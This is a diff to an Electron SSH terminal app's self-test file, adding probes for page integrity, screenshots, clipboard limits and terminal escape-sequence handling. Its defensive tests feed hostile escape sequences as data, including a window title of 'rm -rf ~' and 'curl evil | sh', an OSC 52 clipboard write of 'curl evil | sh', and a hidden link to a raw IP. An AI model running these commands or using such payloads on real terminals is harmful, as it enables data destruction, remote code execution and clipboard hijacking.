@@ -2,14 +2,14 @@
 // and only in an unpackaged build started with SSHAPP_SELFTEST=1. It prints one line, "SELFTEST <json>",
 // and exits with 0 only if every probe held. The lab (Playwright, real SSH servers, the fault proxy)
 // grows out of this; these probes stay as its first cases.
-import { app, clipboard, type BaseWindow, type Session, type WebContentsView } from 'electron';
+import { app, clipboard, nativeImage, type BaseWindow, type Session, type WebContentsView } from 'electron';
 import { spawn, type ChildProcessWithoutNullStreams } from 'node:child_process';
 import { createPublicKey, randomBytes, verify } from 'node:crypto';
 import { createServer } from 'node:http';
 import type { AddressInfo } from 'node:net';
 import { readdir, readFile, stat } from 'node:fs/promises';
 import path from 'node:path';
-import type { ShellState } from '../common/ipc';
+import { COPY_MAX, type ShellState } from '../common/ipc';
 import type { Boxes } from './boxes';
 import type { SignAnswer, SignRequest } from './engine';
 import type { Gate } from './gate';
@@ -44,6 +44,7 @@ interface Ctx {
   dropped(): number;
   droppedOn(): Record<string, number>;
   lateFromClosed(): number;
+  missing(): Record<string, number>;
 }
 
 interface Result {
@@ -119,7 +120,16 @@ async function until(what: () => boolean | Promise<boolean>, ms: number): Promis
 }
 
 const js = <T>(view: WebContentsView, code: string) => view.webContents.executeJavaScript(code, true) as Promise<T>;
-const shown = (t: Tab) => js<string>(t.view, `document.getElementById('out').textContent`);
+const shown = (t: Tab) => js<string>(t.view, `window.berthTerm.text()`);
+// Is the tab's page whole: every stylesheet it names loaded with rules in it, the terminal's typeface loaded, and
+// the library's own hidden text field hidden (it shows when the library's stylesheet is missing).
+interface Dress { sheets: number[]; face: boolean; field: string; }
+const dress = (t: Tab) => js<Dress>(t.view, `document.fonts.ready.then(() => ({
+  sheets: [...document.querySelectorAll('link[rel=stylesheet]')].map((l) => { try { return l.sheet ? l.sheet.cssRules.length : -1; } catch { return -2; } }),
+  face: [...document.fonts].some((f) => f.family.replace(/['"]/g, '') === 'Plex Mono' && f.status === 'loaded'),
+  field: (() => { const f = document.querySelector('.xterm-helper-textarea'); return f ? getComputedStyle(f).opacity + ' ' + getComputedStyle(f).position : 'none'; })(),
+}))`);
+const dressed = (d: Dress) => d.sheets.length >= 3 && d.sheets.every((n) => n > 0) && d.face && d.field === '0 absolute';
 const type = (t: Tab, text: string) => js<void>(t.view, `window.tabPort.send(new TextEncoder().encode(${JSON.stringify(text)}))`);
 // Signals go to one real process only. A pid of 0 would mean "every process in our group", main included:
 // an engine that never started has no pid, and must never be signalled.
@@ -149,7 +159,11 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
     stage = `after "${name}"`;
     results.push({ name, ok, detail: typeof detail === 'string' ? detail : JSON.stringify(detail) });
   };
-  const finish = (code: number) => {
+  const finish = (asked: number) => {
+    // Every mode ends here, so every mode is held to this: a page that asked for a file the app does not hold
+    // was running without a part of itself.
+    check('no page of the app asked for a file the app does not hold', Object.keys(ctx.missing()).length === 0, ctx.missing());
+    const code = asked === 0 && results.every((r) => r.ok) ? 0 : 1;
     process.stdout.write(`SELFTEST ${JSON.stringify({ ok: code === 0, kind: ctx.kind, results })}\n`);
     app.exit(code);
   };
@@ -329,6 +343,14 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         const front = [...ctx.tabs.values()].find((t) => t.id === ctx.shellState().active);
         const made = await takePicture({ win: ctx.win, views: front ? [front.view, ctx.shell] : [ctx.shell], file: path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`), strip: `Berth, the app as built   |   dark   |   window ${size.width}x${size.height}   |   ${what}   |   commit ${commit}`, dist: ctx.dist, harden: ctx.harden });
         check(`a picture: ${what}`, made.width > 0, made);
+        if (name === 'tab-open') {
+          // The picture is the window: in its middle is the tab's terminal, seen through the shell that lies
+          // over it. (Until 2026-11-16 the pictures showed black there, and nothing noticed.)
+          const png = nativeImage.createFromBuffer(await readFile(path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`)));
+          const at = (Math.floor(png.getSize().height / 2) * png.getSize().width + Math.floor(png.getSize().width / 2)) * 4;
+          const px = [...png.toBitmap().subarray(at, at + 3)].reverse().map((v) => v.toString(16).padStart(2, '0')).join('');
+          check('the picture shows the tab through the shell: its middle is the terminal\'s own colour', px === '141b21', px);
+        }
       };
       const shellOnTop = () => {
         const kids = ctx.win.contentView.children;
@@ -422,6 +444,12 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         const t2ok = await until(() => [...ctx.tabs.values()].some((t) => t.place === 'logs' && t.engine.link.phase === 'up'), 20_000);
         check('a place opens a tab there, signed in; the menu is gone and the tab is above the shell', t2ok && !(await has('#box-menu')) && !shellOnTop(), [...ctx.tabs.values()].map((t) => t.engine.link.phase));
         check('the tab says its box and its place, in the box\'s colour', (await text('[data-tab]')).includes('lab-box') && (await text('[data-tab]')).includes('logs') && (await text('#status')).includes('lab-box, logs'), await text('#status'));
+        {
+          const front = [...ctx.tabs.values()].find((t) => t.place === 'logs')!;
+          const worn = await dress(front);
+          check('the tab\'s page is whole: stylesheets, typeface, the terminal\'s own text field out of sight', dressed(worn), worn);
+          await js<void>(front.view, `new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => r())))`);
+        }
         await shot('tab-open', 'a tab open on a box');
 
         // Seven tabs on one box in a 1024-wide window: the box's tabs fold into one, and the count opens them.
@@ -645,7 +673,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       const sealed = await js<boolean>(v, `(window.tabPort ?? window.shellPort).sandboxed`);
       check(`${name}: sandboxed`, sealed === true, sealed);
       const port = await js<string>(v, `Object.keys(window.tabPort ?? window.shellPort).sort().join()`);
-      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gatePickBackup,gateUnlock,meter,onGate,onState,sandboxed' : 'frame,meter,onBanner,onOutput,onShown,onState,sandboxed,send,taken'), port);
+      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gatePickBackup,gateUnlock,meter,onGate,onState,sandboxed' : 'copy,frame,meter,onBanner,onOutput,onShown,onState,resize,sandboxed,send,taken'), port);
     }
     const pids = [process.pid, ...views.map(([, v]) => v.webContents.getOSProcessId()), a.engine.pid, b.engine.pid];
     check('every view and engine is its own process', new Set(pids).size === pids.length && !pids.includes(0), pids);
@@ -787,14 +815,141 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       check('what was agreed is the plan\'s', t.engine.link.cipher === 'aes256-gcm@openssh.com' && ['mlkem768x25519-sha256', 'curve25519-sha256'].includes(t.engine.link.keyExchange), t.engine.link);
       check('the tab says which box and place it is on', JSON.stringify(ctx.shellState().tabs.find((x) => x.id === t.id)?.box) === JSON.stringify({ id, name: 'lab-box', colour: 2, place: 'logs' }), ctx.shellState().tabs);
       await until(async () => (await js<string>(t.view, `document.readyState`)) === 'complete', 10_000);
+      // The box's sign-in text holds a question, a clipboard write and a colour: it is drawn as words on its
+      // own lines, each control character as its picture, and the box's shell is given nothing because of it.
+      const PIC = (c: number) => String.fromCodePoint(0x2400 + c); // a control character's picture
+      await until(async () => (await shown(t)).includes('second line'), 5000);
+      await sleep(200);
+      const signInText = (await shown(t)).split('\n').slice(0, 2);
+      const becauseOfIt = Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
+      check('the box\'s sign-in text is drawn as words, line by line, its control characters as pictures; nothing in it is obeyed or answered', signInText[0] === 'Welcome to the lab box' && signInText[1] === `${PIC(0x1b)}[c${PIC(0x1b)}]52;c;aGlkZGVu${PIC(7)}${PIC(0x1b)}[31msecond line` && becauseOfIt === '', [signInText, JSON.stringify(becauseOfIt)]);
       await type(t, 'typed-into-the-box-5b2');
       check('typed bytes reach the box\'s shell and its output comes back to this tab', await until(async () => (await shown(t)).includes('typed-into-the-box-5b2'), 5000), await shown(t));
       check('another tab saw none of it', !(await shown(a)).includes('typed-into-the-box'), '');
       const seenNow = await lab.tell('seen');
       const sessions = (seenNow['sessions'] ?? []) as { Asked?: string[]; Command?: string; Term?: string; Cols?: number; Rows?: number }[];
       const last = sessions[sessions.length - 1];
-      check('the box was asked for a terminal and the place\'s one start command, and nothing else', sessions.length === 1 && JSON.stringify(last?.Asked) === '["pty-req","exec"]' && last?.Command === `cd -- '/var/log/it'\\''s here' && exec "$SHELL" -l` && last?.Term === 'xterm-256color' && last?.Cols === 120 && last?.Rows === 40, seenNow);
+      check('the box was asked for a terminal and the place\'s one start command, and nothing else', sessions.length === 1 && JSON.stringify(last?.Asked?.slice(0, 2)) === '["pty-req","exec"]' && (last?.Asked ?? []).slice(2).every((x) => x === 'window-change') && last?.Command === `cd -- '/var/log/it'\\''s here' && exec "$SHELL" -l` && last?.Term === 'xterm-256color', seenNow);
+      const sizeNow = await js<{ cols: number; rows: number }>(t.view, `window.berthTerm.size()`);
+      check(`the box's terminal was opened at this tab's own size, ${sizeNow.cols} x ${sizeNow.rows}, and never told a size twice`, last?.Cols === sizeNow.cols && last?.Rows === sizeNow.rows && sizeNow.cols > 40 && (last?.Asked ?? []).length === 2, [last?.Cols, last?.Rows, sizeNow, last?.Asked]);
+      const worn = await dress(t);
+      check('the tab\'s page is whole: each of its stylesheets loaded, the terminal\'s typeface too, the terminal\'s own text field out of sight', dressed(worn), worn);
       check('it signed in as the box\'s user', Array.isArray(seenNow['users']) && (seenNow['users'] as string[]).every((u) => u === 'demo'), seenNow['users']);
+
+      // ---- What a box may not do through the terminal (plan B3, B10). The box prints; the app must send back
+      // nothing but the written answers, and nothing of the PC may change. The box's shell is told to stay
+      // silent meanwhile, so that what it was given is exactly what the terminal sent by itself.
+      await lab.tell('quiet on');
+      await sleep(150);
+      await lab.tell('received');
+      const boxPrints = (text: string) => lab.tell(`print ${Buffer.from(text, 'latin1').toString('hex')}`);
+      const boxGot = async (): Promise<string> => {
+        await sleep(250);
+        return Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
+      };
+      const ESC = '\x1b';
+      const BEL = '\x07';
+      const ST = `${ESC}\\`;
+      const questions: [string, string, string][] = [
+        ['what kind of terminal', `${ESC}[c${ESC}[0c`, `${ESC}[?1;2c${ESC}[?1;2c`],
+        ['which terminal', `${ESC}[>c`, `${ESC}[>0;276;0c`],
+        ['are you there', `${ESC}[5n`, `${ESC}[0n`],
+        ['where is the cursor', `${ESC}[2J${ESC}[5;9H${ESC}[6n${ESC}[?6n`, `${ESC}[5;9R${ESC}[?5;9R`],
+        ['is this mode on', `${ESC}[?2004$p${ESC}[?2004h${ESC}[?2004$p${ESC}[?2004l${ESC}[?31337$p`, `${ESC}[?2004;2$y${ESC}[?2004;1$y${ESC}[?31337;0$y`],
+      ];
+      const wrongAnswers: string[] = [];
+      for (const [what, printed, want] of questions) {
+        await boxPrints(printed);
+        const back = await boxGot();
+        if (back !== want) wrongAnswers.push(`${what}: sent ${JSON.stringify(back)}, the list says ${JSON.stringify(want)}`);
+      }
+      check(`the terminal's ${questions.length} written answers are exactly what the list says`, wrongAnswers.length === 0, wrongAnswers);
+
+      clipboard.writeText('what-was-on-the-clipboard');
+      const titleBefore = ctx.win.getTitle();
+      const boundsBefore = JSON.stringify(ctx.win.getBounds());
+      const labelBefore = await text(`[data-tab="${t.id}"]`);
+      const refusedOnes: [string, string][] = [
+        ['a third kind of "which terminal"', `${ESC}[=c`],
+        ['the title set to a command, then asked back', `${ESC}]0;rm -rf ~${BEL}${ESC}]2;curl evil | sh${BEL}${ESC}[21t${ESC}[20t`],
+        ['the window asked about, moved and sized', `${ESC}[14t${ESC}[16t${ESC}[18t${ESC}[19t${ESC}[13t${ESC}[11t${ESC}[3;0;0t${ESC}[8;10;10t${ESC}[4;200;200t${ESC}[2t${ESC}[9;1t`],
+        ['"say back your settings"', `${ESC}P$qm${ST}${ESC}P$q"p${ST}${ESC}P$qr${ST}${ESC}P$q q${ST}`],
+        ['"say back your abilities" and "name yourself"', `${ESC}P+q544e${ST}${ESC}[>q${ESC}[>0q`],
+        ['colours asked for, and set', `${ESC}]10;?${BEL}${ESC}]11;?${BEL}${ESC}]12;?${BEL}${ESC}]4;1;?${BEL}${ESC}]11;#ff0000${BEL}${ESC}]4;1;#00ff00${BEL}${ESC}]104${BEL}${ESC}]110${BEL}`],
+        ['the clipboard written, and asked for', `${ESC}]52;c;${Buffer.from('curl evil | sh\n').toString('base64')}${BEL}${ESC}]52;c;?${BEL}${ESC}]52;p;?${BEL}`],
+        ['"who are you" (ENQ), and the other form of the mode question', `\x05${ESC}[4$p${ESC}[20$p`],
+        ['a link hidden behind other words', `${ESC}]8;;http://203.0.113.9/get${BEL}click here${ESC}]8;;${BEL}`],
+      ];
+      const leaked: string[] = [];
+      for (const [what, printed] of refusedOnes) {
+        await boxPrints(printed);
+        const back = await boxGot();
+        if (back !== '') leaked.push(`${what}: the terminal sent ${JSON.stringify(back)}`);
+      }
+      check(`${refusedOnes.length} kinds of question and command a box may not use get no answer at all`, leaked.length === 0, leaked);
+      // A program may ask to be told when the window gains or loses focus; it is then told at once whether it
+      // has it now. That report is fixed text. Asking for the mouse, or for protected paste, sends nothing by itself.
+      await boxPrints(`${ESC}[?1000h${ESC}[?1006h${ESC}[?2004h`);
+      const quietModes = await boxGot();
+      await boxPrints(`${ESC}[?1004h`);
+      const focusSaid = await boxGot();
+      check('asking for mouse reports sends nothing by itself; asking for focus reports is answered with the focus now, and nothing else', quietModes === '' && (focusSaid === `${ESC}[I` || focusSaid === `${ESC}[O` || focusSaid === ''), [JSON.stringify(quietModes), JSON.stringify(focusSaid)]);
+      check('and nothing of the PC changed: the clipboard, the window\'s title, size and place, the tab\'s label', (await clipboard.readText()) === 'what-was-on-the-clipboard' && ctx.win.getTitle() === titleBefore && JSON.stringify(ctx.win.getBounds()) === boundsBefore && (await text(`[data-tab="${t.id}"]`)) === labelBefore, [await clipboard.readText(), ctx.win.getTitle(), await text(`[data-tab="${t.id}"]`)]);
+      // The words that came with a hidden link: the pointer is moved onto them. Over a link it would turn
+      // into a hand; over plain words it does not.
+      const words = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
+      if (words) t.view.webContents.sendInputEvent({ type: 'mouseMove', x: words.x, y: words.y });
+      await sleep(400);
+      const over = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
+      const drawn = await js<{ links: number; shown: boolean; faults: string[] }>(t.view, `({ links: document.querySelectorAll('#term a').length, shown: window.berthTerm.text().includes('click here'), faults: window.berthTerm.policyFaults() })`);
+      check('the hidden link is plain words with nothing behind them, also under the pointer; the page\'s own policy was never broken', drawn.links === 0 && drawn.shown && drawn.faults.length === 0 && over !== null && !over.hand, [drawn, over]);
+      await boxPrints(`${ESC}[?1004l${ESC}[?1000l${ESC}[?1006l${ESC}[?2004l${ESC}[2J${ESC}[H`);
+
+      // Paste is not the terminal's: with text on the clipboard, no paste key and no drop puts it on the box.
+      clipboard.writeText('echo this-came-from-the-clipboard');
+      t.view.webContents.focus();
+      for (const [keyCode, modifiers] of [['V', ['control']], ['V', ['control', 'shift']], ['Insert', ['shift']]] as [string, ('control' | 'shift')[]][]) {
+        t.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
+        t.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
+      }
+      t.view.webContents.paste();
+      await js(t.view, `(() => { const el = document.querySelector('#term textarea'); for (const type of ['paste', 'drop']) { const d = new DataTransfer(); d.setData('text/plain', 'echo this-came-from-the-clipboard'); el.dispatchEvent(type === 'paste' ? new ClipboardEvent('paste', { clipboardData: d, bubbles: true, cancelable: true }) : new DragEvent('drop', { dataTransfer: d, bubbles: true, cancelable: true })); } })()`);
+      const afterPaste = await boxGot();
+      check('no paste key, no menu paste and no drop puts the clipboard on the box (paste will be main\'s, not the terminal\'s)', !afterPaste.includes('clipboard') && afterPaste.replace(/\x16/g, '') === '', JSON.stringify(afterPaste));
+
+      // Select to copy: only the tab in front of the window in use may leave text on the clipboard.
+      clipboard.writeText('untouched');
+      await js(a.view, `window.tabPort.copy('from a tab that is not in front')`);
+      await sleep(150);
+      check('a tab that is not in front cannot put text on the clipboard', (await clipboard.readText()) === 'untouched', await clipboard.readText());
+      // The tab in front can, and the window says what was copied; not while a dialog or menu is over it; and
+      // never more than the limit.
+      const frontTab = ctx.tabs.get(ctx.shellState().active)!;
+      ctx.win.focus();
+      await sleep(150);
+      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
+      await js(frontTab.view, `window.tabPort.copy('from under a dialog')`);
+      await sleep(150);
+      const underDialog = await clipboard.readText();
+      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
+      const droppedBeforeCopy = ctx.dropped();
+      await js(frontTab.view, `window.tabPort.copy('x'.repeat(${COPY_MAX} + 1))`);
+      await sleep(400);
+      const tooMuch = await clipboard.readText();
+      refusedByTheLock++;
+      check('a tab under a dialog cannot either; and more than the limit at once is refused whole', underDialog === 'untouched' && tooMuch === 'untouched' && ctx.dropped() === droppedBeforeCopy + 1, [underDialog.slice(0, 40), tooMuch.length, ctx.dropped() - droppedBeforeCopy]);
+      await js(frontTab.view, `window.tabPort.copy('one\\ntwo')`);
+      await sleep(250);
+      check('the tab in front of the window in use can: the text is on the clipboard, and the window says what was copied', (await clipboard.readText()) === 'one\ntwo' && (await text('#status')).includes('Copied 2 lines'), [await clipboard.readText(), await text('#status'), ctx.win.isFocused()]);
+      // A size that is none (no cells, absurdly many, not a number) is refused and never reaches the box.
+      const droppedBeforeSize = ctx.dropped();
+      const askedBefore = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
+      await js(t.view, `(window.tabPort.resize(0, 40), window.tabPort.resize(80, 99999), window.tabPort.resize('wide', 24), window.tabPort.resize(80.5, 24))`);
+      await sleep(300);
+      refusedByTheLock += 4;
+      const askedAfter = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
+      check('a terminal size that is none is refused, and the box is told nothing', ctx.dropped() === droppedBeforeSize + 4 && askedAfter === askedBefore, [ctx.dropped() - droppedBeforeSize, askedAfter]);
+      await lab.tell('quiet off');
 
       // The key process signs a sign-in for its own box and user, and nothing else, whoever asks.
       const data = signInData('demo', box().publicKey);
@@ -852,7 +1007,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
     }
 
     check('no view ever reached the canary web server', canaryHits === 0, canaryHits);
-    check(`no message was dropped, but the ones the lock refused on purpose (late from a closed view, not acted on: ${ctx.lateFromClosed()})`, ctx.dropped() === refusedByTheLock, [ctx.dropped(), refusedByTheLock, ctx.droppedOn()]);
+    check(`no message was dropped, but the ones refused on purpose (late from a closed view, not acted on: ${ctx.lateFromClosed()})`, ctx.dropped() === refusedByTheLock, [ctx.dropped(), refusedByTheLock, ctx.droppedOn()]);
   } catch (err) {
     check('no probe threw', false, err instanceof Error ? (err.stack ?? err.message) : String(err));
   }
